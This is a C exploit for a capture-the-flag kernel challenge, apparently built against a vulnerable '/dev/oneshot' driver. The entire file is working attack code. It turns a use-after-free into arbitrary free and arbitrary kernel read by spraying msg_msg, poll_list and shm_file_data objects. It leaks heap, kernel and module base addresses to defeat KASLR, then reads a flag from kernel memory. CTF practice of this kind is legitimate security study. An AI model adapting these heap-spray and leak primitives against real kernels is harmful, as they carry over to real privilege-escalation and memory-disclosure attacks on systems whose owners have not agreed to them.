#include "libpwn.c"

#define DEVICE "/dev/oneshot"
#define KALLOC 0x13370001
#define KFREE 0x13370002

#define SPRAY_WIDTH 30
#define KOBJ_SIZE 0x1000
#define MSG_SIZE (KOBJ_SIZE - 0x30)
#define MSG_TWO_SEGMENT_SIZE (MSG_SIZE+0x1000-0x8+0x20)
#define MSG_ONE_SEGMENT_SIZE (MSG_SIZE+0x1000-0x18)
#define POLL_NFDS 542
#define FLAG_ADDR (kmodule_base + (0x21c0))
#define EGG 0x4141414141414100

int fd;
u64 kmodule_base;
struct pollfd *pfds;
char buffer[0x2000];
int msqid[SPRAY_WIDTH*6];

void ioctl_alloc(char* data) {
    if (ioctl(fd, KALLOC, data) < 0) {
        error("ioctl_alloc");
    }
}

void ioctl_free() {
    if (ioctl(fd, KFREE, 0) < 0) {
        error("ioctl_free");
    }
}

void* alloc_poll() {
    int ret = poll(pfds, POLL_NFDS, 3000);
}

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    // ===========================
    // UAF -> ARB FREE
    // ===========================
    ioctl_alloc(buffer);
    ioctl_free();

    for(int i = 0; i < SPRAY_WIDTH; i++) {
        msqid[i] = create_msg_queue();
        ((u64 *)buffer)[0] = EGG + i;
        send_msg(msqid[i], MSG_SIZE, buffer);   
    }
    _pause_("msg_msg sprayed [1]");

    ioctl_free();
    for(int i = SPRAY_WIDTH; i < SPRAY_WIDTH*2; i++) {
        msqid[i] = create_msg_queue();
        memset(buffer, i, sizeof(buffer));
        send_msg(msqid[i], MSG_TWO_SEGMENT_SIZE, buffer);   
    }
    _pause_("msg_msg sprayed [2]");

    // ===========================
    // SPRAY poll_list
    // ===========================
    ioctl_free();
    pfds = calloc(POLL_NFDS, sizeof(struct pollfd));
    for(int i = 0; i < POLL_NFDS; i++) {
        pfds[i].fd = open("/etc/passwd", O_RDONLY);
        pfds[i].events = POLLERR;
    }
    pthread_t t[SPRAY_WIDTH];
    for(int i = 0; i < SPRAY_WIDTH; i++) {
        pthread_create(&t[i], NULL, alloc_poll, NULL);
    }
    sleep(5); // wait for poll_list to be freed
    _pause_("pollfd sprayed");

    // ===========================
    // SPRAY shm_file_data
    // ===========================
    int shmid = shmget(IPC_PRIVATE, 0x1000, 0600);
    info2("shmid: %d", shmid);
    for(int i = 0; i < 200; i++) {
        assert(shmid >= 0);
        void *addr = shmat(0, NULL, 0); // only shmid 0 because the first 8 bytes needs to be NULL
        assert((long)addr >= 0);
    }
    _pause_("shmid sprayed");

    // ===========================
    // GAIN LEAK
    // ===========================
    char* leak = (char *) peek_msg(msqid[30], MSG_TWO_SEGMENT_SIZE);
    // dump_hex(leak, MSG_SEGMENT_SIZE);

    u64 heap = ((u64 *)leak)[1019]; 
    kbase = ((u64 *)leak)[1020] - 0x121a6c0;
    info2("heap", heap);
    info2("kbase", kbase); 

    // ===========================
    // LEAK KERNEL MODULE BASE
    // ===========================
    for(int i = SPRAY_WIDTH*2; i < SPRAY_WIDTH*3; i++) {
        msqid[i] = create_msg_queue();
        ((u64 *)buffer)[0] = EGG + i;
        send_msg(msqid[i], MSG_SIZE, buffer);    
    }
    _pause_("msg_msg sprayed [3]");

    ioctl_free();
    memset(buffer, 0, sizeof(buffer));
    u64 *payload = (u64 *)&buffer[MSG_SIZE];

    for(int i = SPRAY_WIDTH*3; i < SPRAY_WIDTH*4; i++) {
        msqid[i] = create_msg_queue();
        payload[1] = 0x1;
        payload[2] = 0xfd0+0x60; 
        payload[3] = kbase+0x180d0a0-0x8; // just a little behind to satisfy constraint *next is NULL
        payload[4] = heap;
        payload[5] = EGG + 0xff;
        send_msg(msqid[i], MSG_ONE_SEGMENT_SIZE, buffer);   
    }
    _pause_("msg_msg sprayed [4]");

    leak = (char *) peek_msg(msqid[0], 0xfd0+0x60);
    // dump_hex(leak, 0xfd0+0x60);
    kmodule_base = ((u64 *)leak)[507]; 

    // ===========================
    // ARB READ FLAG
    // ===========================
    ioctl_free();
    for(int i = SPRAY_WIDTH*4; i < SPRAY_WIDTH*5; i++) {
        msqid[i] = create_msg_queue();
        ((u64 *)buffer)[0] = EGG + i;
        send_msg(msqid[i], MSG_SIZE, buffer);    
    }
    _pause_("msg_msg sprayed [5]");

    ioctl_free();
    memset(buffer, 0, sizeof(buffer));
    payload = (u64 *)&buffer[MSG_SIZE];

    for(int i = SPRAY_WIDTH*5; i < SPRAY_WIDTH*6; i++) {
        msqid[i] = create_msg_queue();
        payload[1] = 0x1;
        payload[2] = 0xfd0+0x60;
        payload[3] = FLAG_ADDR-0x20; // just a little behind to satisfy constraint *next is NULL
        payload[4] = heap;
        payload[5] = EGG + 0xff;
        send_msg(msqid[i], MSG_ONE_SEGMENT_SIZE, buffer);   
    }
    _pause_("msg_msg sprayed [6]");

    leak = (char *) peek_msg(msqid[0], 0xfd0+0x60);
    // dump_hex(leak, 0xfd0+0x60);

    printf("[*] flag: %s\n", &leak[0xff0]);

    _pause_("end of exploit...");
}